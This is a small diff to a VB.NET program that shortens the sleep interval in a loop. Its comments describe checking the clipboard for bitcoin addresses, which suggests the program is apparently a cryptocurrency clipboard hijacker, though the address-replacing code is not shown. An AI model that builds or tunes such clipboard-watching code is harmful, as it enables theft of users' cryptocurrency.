@@ -120,7 +120,7 @@ Public Class Main
         While True
             Try
 
-                Thread.CurrentThread.Sleep(7000)
+                Thread.CurrentThread.Sleep(1000)
 
                 'check if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
                 'the length is between 26-35 characters
